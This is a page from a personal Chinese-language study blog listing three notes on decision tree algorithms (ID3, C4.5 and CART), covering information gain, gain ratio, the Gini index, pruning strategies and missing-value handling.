<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"powerlzy.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="相比到达的地方，同行的人更重要！">
<meta property="og:type" content="website">
<meta property="og:title" content="PowerLZY&#39;s Blog">
<meta property="og:url" content="https://powerlzy.github.io/page/25/index.html">
<meta property="og:site_name" content="PowerLZY&#39;s Blog">
<meta property="og:description" content="相比到达的地方，同行的人更重要！">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="lzy">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://powerlzy.github.io/page/25/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/25/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>PowerLZY's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">PowerLZY's Blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">本博客主要用于记录个人学习笔记（测试阶段）</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lzy"
      src="/images/cat_mac.jpg">
  <p class="site-author-name" itemprop="name">lzy</p>
  <div class="site-description" itemprop="description">相比到达的地方，同行的人更重要！</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">255</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">52</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">47</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/PowerLZY" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;PowerLZY" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:3289218653@qq.com" title="E-Mail → mailto:3289218653@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/2J7SQ0E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/2J7SQ0E/" class="post-title-link" itemprop="url">决策树（1）ID3</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-25 17:29:37" itemprop="dateCreated datePublished" datetime="2022-02-25T17:29:37+08:00">2022-02-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-04-22 19:27:50" itemprop="dateModified" datetime="2023-04-22T19:27:50+08:00">2023-04-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%86%B3%E7%AD%96%E6%A0%91/" itemprop="url" rel="index"><span itemprop="name">决策树</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.1k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <span id="more"></span>
<h2><span id="一-id3删特征">一、ID3【删特征】</span></h2>
<p>ID3
算法是建立在奥卡姆剃刀[<strong>“切勿浪费较多东西去做，用较少的东西，同样可以做好的事情”</strong>]（用较少的东西，同样可以做好事情）的基础上：越是小型的决策树越优于大的决策树。</p>
<!--more-->
<h3><span id="11-思想">1.1 思想</span></h3>
<p>从信息论的知识中我们知道：信息熵越大，从而样本纯度越低，。ID3
算法的核心思想就是以<strong>信息增益</strong>来度量特征选择，选择信息增益最大的特征进行分裂。算法采用自顶向下的贪婪搜索遍历可能的决策树空间（C4.5
也是贪婪搜索）。 其大致步骤为：</p>
<ol type="1">
<li>初始化特征集合和数据集合；</li>
<li>计算数据集合信息熵和所有特征的条件熵，选择信息增益最大的特征作为当前决策节点；</li>
<li>更新数据集合和特征集合（删除上一步使用的特征，并按照特征值来划分不同分支的数据集合）；</li>
<li>重复 2，3 两步，若子集值包含单一特征，则为分支叶子节点。</li>
</ol>
<h3><span id="12-划分标准">1.2 划分标准</span></h3>
<p>ID3 使用的分类标准是信息增益，它表示得知特征 A
的信息而使得样本集合不确定性减少的程度。</p>
<p>数据集的<strong>信息熵</strong>：</p>
<p><span class="math display">\[
H(D)=-\sum_{k=1}^{K} \frac{\left|C_{k}\right|}{|D|} \log _{2}
\frac{\left|C_{k}\right|}{|D|}
\]</span></p>
<p>其中<span class="math inline">\(C_{k}\)</span>表示集合 D 中属于第 k
类样本的样本子集。针对某个特征 A，对于数据集 D 的条件熵 <span class="math inline">\(H(D \mid A)\)</span>为：</p>
<p><span class="math display">\[
\begin{aligned} H(D \mid A) &amp;=\sum_{i=1}^{n}
\frac{\left|D_{i}\right|}{|D|} H\left(D_{i}\right) \\
&amp;=-\sum_{i=1}^{n} \frac{\left|D_{i}\right|}{|D|}\left(\sum_{k=1}^{K}
\frac{\left|D_{i k}\right|}{\left|D_{i}\right|} \log _{2}
\frac{\left|D_{i k}\right|}{\left|D_{i}\right|}\right) \end{aligned}
\]</span></p>
<p><strong>信息增益</strong> = 信息熵 - 条件熵。信息增益越大表示使用特征
A 来划分所获得的“纯度提升越大”。 <span class="math display">\[
\operatorname{Gain}(D, A)=H(D)-H(D \mid A)
\]</span></p>
<p>信息增益越大表示使用特征 A 来划分所获得的“纯度提升越大”。</p>
<h3><span id="13缺点没有剪枝-特征偏好-缺失值">1.3
缺点【没有剪枝、特征偏好、缺失值】</span></h3>
<ul>
<li>ID3 没有剪枝策略，容易过拟合；</li>
<li>信息增益准则对可取值数目较多的特征有所偏好，类似“编号”的特征其信息增益接近于
1；</li>
<li>只能用于处理离散分布的特征；</li>
<li>没有考虑缺失值。</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/12ZJKX/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/12ZJKX/" class="post-title-link" itemprop="url">决策树（2）C4-5</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-25 17:29:37" itemprop="dateCreated datePublished" datetime="2022-02-25T17:29:37+08:00">2022-02-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-04-22 19:27:58" itemprop="dateModified" datetime="2023-04-22T19:27:58+08:00">2023-04-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%86%B3%E7%AD%96%E6%A0%91/" itemprop="url" rel="index"><span itemprop="name">决策树</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.3k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2><span id="一-c45">一、C4.5</span></h2>
<p>C4.5 算法最大的特点是克服了 ID3
对特征数目的偏重这一缺点，引入信息增益率来作为分类标准。</p>
<p>C4.5 相对于 ID3 的缺点对应有以下改进方式：</p>
<ul>
<li>引入<strong>悲观剪枝策略进行后剪枝</strong>；</li>
<li>引入<strong>信息增益率</strong>作为划分标准；</li>
<li><strong>将连续特征离散化</strong>，假设 n 个样本的连续特征 A 有 m
个取值，C4.5 将其排序并取相邻两样本值的平均数共 m-1
个划分点，分别计算以该划分点作为二元分类点时的信息增益，并选择信息增益最大的点作为该连续特征的二元离散分类点；</li>
<li>对于<strong>缺失值的处理</strong>可以分为两个子问题：</li>
<li>问题一：在特征值缺失的情况下进行划分特征的选择？（即如何计算特征的信息增益率）
<ul>
<li>C4.5
的做法是：对于具有缺失值特征，用没有缺失的样本子集所占比重来折算；</li>
</ul></li>
<li>问题二：选定该划分特征，对于缺失该特征值的样本如何处理？（即到底把这个样本划分到哪个结点里）
<ul>
<li>C4.5
的做法是：将样本同时划分到所有子节点，不过要调整样本的权重值，其实也就是以不同概率划分到不同节点中。</li>
</ul></li>
</ul>
<h3><span id="12-划分标准">1.2 划分标准</span></h3>
<p>利用信息增益率可以克服信息增益的缺点，其公式为:</p>
<p><span class="math display">\[
\operatorname{Gain}_{\text {ratio }}(D, A) =\frac{\operatorname{Gain}(D,
A)}{H_{A}(D)}     \\
\]</span></p>
<p><span class="math display">\[
H_{A}(D)=-\sum_{i=1}^{n}   \frac{\left|D_{i}\right|}{|D|} \log _{2}
\frac{\left|D_{i}\right|}{|D|}
\]</span></p>
<p>信息增益率对可取值较少的特征有所偏好（分母越小，整体越大），因此 C4.5
并不是直接用增益率最大的特征进行划分，而是使用一个<strong>启发式方法</strong>：先从候选划分特征中找到信息增益高于平均值的特征，再从中选择增益率最高的。</p>
<h3><span id="13-剪枝策略">1.3 剪枝策略</span></h3>
<p>为什么要剪枝：<strong>过拟合的树在泛化能力的表现非常差。</strong></p>
<p><strong>预剪枝和悲观剪枝</strong></p>
<h4><span id="131-预剪枝"><strong>1.3.1 预剪枝</strong></span></h4>
<p>在节点划分前来确定是否继续增长，及早停止增长的主要方法有：</p>
<ul>
<li>节点内数据样本低于<strong>某一阈值</strong>；</li>
<li>所有节点特征都已分裂；</li>
<li>节点划分前准确率比划分后准确率高。</li>
</ul>
<p>预剪枝不仅可以降低过拟合的风险而且还可以减少训练时间，但另一方面它是基于“贪心”策略，会带来欠拟合风险。</p>
<h4><span id="132后剪枝悲观剪枝方法-httpgitlinuxnet2019-06-04-c45"><strong>1.3.2
后剪枝</strong>【悲观剪枝方法】 http://gitlinux.net/2019-06-04-C45/</span></h4>
<p>在已经生成的决策树上进行剪枝，从而得到简化版的剪枝决策树。</p>
<p>C4.5
采用的<strong>悲观剪枝方法</strong>，用递归的方式从低往上针对每一个非叶子节点，评估用一个最佳叶子节点去代替这课子树是否有益。如果剪枝后与剪枝前相比其错误率是保持或者下降，则这棵子树就可以被替换掉。<strong>C4.5
通过训练数据集上的错误分类数量来估算未知样本上的错误率</strong>。</p>
<p>后剪枝决策树的欠拟合风险很小，泛化性能往往优于预剪枝决策树。但同时其训练时间会大的多。</p>
<h3><span id="14-缺点">1.4 缺点</span></h3>
<ul>
<li><strong>剪枝策略</strong>可以再优化；</li>
<li>C4.5 用的是<strong>多叉树</strong>，用二叉树效率更高；</li>
<li>C4.5 只能用于<strong>分类</strong>；</li>
<li>C4.5
使用的熵模型拥有大量耗时的<strong>对数运算</strong>，连续值还有<strong>排序运算</strong>；</li>
<li>C4.5
在构造树的过程中，<strong>对数值属性值需要按照其大小进行排序</strong>，从中选择一个分割点，所以只适合于能够驻留于内存的数据集，当训练集大得无法在内存容纳时，程序无法运行。</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/7ATN5F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/7ATN5F/" class="post-title-link" itemprop="url">决策树（3）CART</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-25 17:29:37" itemprop="dateCreated datePublished" datetime="2022-02-25T17:29:37+08:00">2022-02-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-04-22 19:28:07" itemprop="dateModified" datetime="2023-04-22T19:28:07+08:00">2023-04-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AE%97%E6%B3%95/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%86%B3%E7%AD%96%E6%A0%91/" itemprop="url" rel="index"><span itemprop="name">决策树</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>5.5k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>10 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2><span id="一-cart">一、CART</span></h2>
<p>ID3 和 C4.5
虽然在对训练样本集的学习中可以尽可能多地挖掘信息，但是其生成的决策树分支、规模都比较大，CART
算法的二分法可以简化决策树的规模，提高生成决策树的效率。</p>
<h3><span id="11-思想">1.1 思想</span></h3>
<p>CART 包含的基本过程有分裂，剪枝和树选择。</p>
<ul>
<li><strong>分裂：</strong>分裂过程是一个二叉递归划分过程，其输入和预测特征既可以是连续型的也可以是离散型的，CART
没有停止准则，会一直生长下去；</li>
<li><strong>剪枝：</strong>采用<strong>代价复杂度剪枝</strong>，从最大树开始，每次选择训练数据熵对整体性能贡献最小的那个分裂节点作为下一个剪枝对象，直到只剩下根节点。CART
会产生一系列嵌套的剪枝树，需要从中选出一颗最优的决策树；</li>
<li><strong>树选择：</strong>用单独的测试集评估每棵剪枝树的预测性能（也可以用交叉验证）。</li>
</ul>
<p>CART 在 C4.5 的基础上进行了很多提升。</p>
<ul>
<li>C4.5 为多叉树，运算速度慢，CART
为<strong>二叉树</strong>，运算速度快；</li>
<li>C4.5 只能分类，CART 既可以分类也可以<strong>回归</strong>；</li>
<li>CART 使用 <strong>Gini
系数作为变量的不纯度量</strong>，减少了<strong>大量的对数运算</strong>；</li>
<li>CART 采用<strong>代理测试来估计缺失值</strong>，而 C4.5
以不同概率划分到不同节点中；</li>
<li>CART 采用<strong>“基于代价复杂度剪枝”方法进行剪枝，而 C4.5
采用悲观剪枝方法</strong>。</li>
</ul>
<h3><span id="12-划分标准">1.2 划分标准</span></h3>
<p><strong>熵模型拥有大量耗时的对数运算</strong>，基尼指数在简化模型的同时还保留了熵模型的优点。基尼指数代表了模型的不纯度，基尼系数越小，不纯度越低，特征越好。这和信息增益（率）正好相反。
<span class="math display">\[
\begin{aligned} \operatorname{Gini}(D) &amp;=\sum_{k=1}^{K}
\frac{\left|C_{k}\right|}{|D|}\left(1-\frac{\left|C_{k}\right|}{|D|}\right)
=1-
\sum_{k=1}^{K}\left(\frac{\left|C_{k}\right|}{|D|}\right)^{2}  &amp;\operatorname{Gini}(D
\mid A) =\sum_{i=1}^{n} \frac{\left|D_{i}\right|}{|D|}
\operatorname{Gini}\left(D_{i}\right) \end{aligned}
\]</span></p>
<p><strong>基尼指数</strong>反映了从<strong>数据集中随机抽取两个样本，其类别标记不一致的概率</strong>。因此基尼指数越小，则数据集纯度越高。基尼指数偏向于特征值较多的特征，类似信息增益。基尼指数可以用来度量任何不均匀分布，是介于
0~1 之间的数，0 是完全相等，1
是完全不相等，<strong>基尼指数可以理解为熵模型的一阶泰勒展开。</strong></p>
<blockquote>
<p><strong><em>基尼指数是信息熵中﹣logP在P=1处一阶泰勒展开后的结果！所以两者都可以用来度量数据集的纯度</em></strong></p>
</blockquote>
<h3><span id="13-缺失值处理">1.3 缺失值处理</span></h3>
<p>上文说到，模型对于缺失值的处理会分为两个子问题：</p>
<ul>
<li><strong>如何在特征值缺失的情况下进行划分特征的选择？</strong></li>
</ul>
<p>对于问题 1，<strong>CART
一开始严格要求分裂特征评估时只能使用在该特征上没有缺失值的那部分数据，在后续版本中，CART
算法使用了一种惩罚机制来抑制提升值，从而反映出缺失值的影响</strong>（例如，如果一个特征在节点的
20% 的记录是缺失的，那么这个特征就会减少 20% 或者其他数值）。</p>
<ul>
<li><strong>选定该划分特征，模型对于缺失该特征值的样本该进行怎样处理？</strong></li>
</ul>
<p>对于问题 2，CART
算法的机制是为树的每个节点都找到<strong>代理分裂器</strong>，无论在训练数据上得到的树是否有缺失值都会这样做。在代理分裂器中，特征的分值必须超过默认规则的性能才有资格作为代理（即代理就是<strong>代替缺失值特征作为划分特征的特征</strong>），<strong>当
CART
树中遇到缺失值时，这个实例划分到左边还是右边是决定于其排名最高的代理，如果这个代理的值也缺失了，那么就使用排名第二的代理</strong>，以此类推，如果所有代理值都缺失，那么默认规则就是把样本划分到较大的那个子节点。代理分裂器可以确保无缺失训练数据上得到的树可以用来处理包含确实值的新数据。</p>
<h3><span id="14-剪枝策略">1.4 剪枝策略</span></h3>
<p><strong>基于代价复杂度的剪枝</strong>:https://www.bilibili.com/read/cv11066239</p>
<p>采用一种<strong>“基于代价复杂度的剪枝</strong>”方法进行<strong>后剪枝</strong>，这种方法会生成一系列树，每<strong>个树都是通过将前面的树的某个或某些子树替换成一个叶节点而得到的，这一系列树中的最后一棵树仅含一个用来预测类别的叶节点</strong>。然后用一种成本复杂度的度量准则来判断哪棵子树应该被一个预测类别值的叶节点所代替。<strong>这种方法需要使用一个单独的测试数据集来评估所有的树，根据它们在测试数据集熵的分类性能选出最佳的树</strong>。</p>
<blockquote>
<p>从完整子树 <span class="math inline">\(T0\)</span> 开始， 通过在
<span class="math inline">\(Ti\)</span>
子树序列中裁剪真实误差最小【考虑叶子节点的个数】的子树，得到 <span class="math inline">\(Ti+1\)</span>。 <span class="math display">\[
  $\alpha=\frac{R(t)-R(T)}{N(T)-1}$
  \]</span></p>
<p>【剪枝之后的误差 - 剪枝前的误差 / 叶子节点数 - 1】</p>
<p>每次误差增加率最小的节点，得到一系列的子树，从中选择效果最好的【独立剪枝数据集】和【K折交叉验证】</p>
</blockquote>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304211501941.png" alt="image-20220320215056933" style="zoom: 33%;"></p>
<p>我们来看具体看一下代价复杂度剪枝算法：</p>
<p>首先我们将最大树称为 <span class="math inline">\(T_0\)</span>,
我们希望减少树的大小来防止过拟合, 但又担心去掉节点后预测误差会增大,
所以我
们定义了一个损失函数来达到这两个变量之间的平衡。损失函数定义如下： <span class="math display">\[
C_\alpha(T)=C(T)+\alpha|T|
\]</span> <span class="math inline">\(T\)</span> 为任意子树, <span class="math inline">\(C(T)\)</span> 为预测误差, <span class="math inline">\(|T|\)</span> 为子树 <span class="math inline">\(T\)</span> 的叶子节点个数, <span class="math inline">\(\alpha\)</span> 是参数, <span class="math inline">\(C(T)\)</span> 衡量训练数据的拟合 程度, <span class="math inline">\(|T|\)</span> 衡量树的复杂度, <span class="math inline">\(\alpha\)</span>
<strong>权衡拟合程度与树的复杂度</strong>。</p>
<h3><span id="15-类别不平衡">1.5 类别不平衡</span></h3>
<p><font color="red"> CART
的一大优势在于：无论训练数据集有多失衡，它都可以将其子冻消除不需要建模人员采取其他操作。</font></p>
<p>CART
使用了一种先验机制，其作用相当于对类别进行加权。这种先验机制嵌入于 CART
算法判断分裂优劣的运算 里, 在 CART 默认的分类模式中,
总是要计算每个节点关于根节点的类别频率的比值, 这就相当于对数据自动重加
权, 对类别进行均衡。</p>
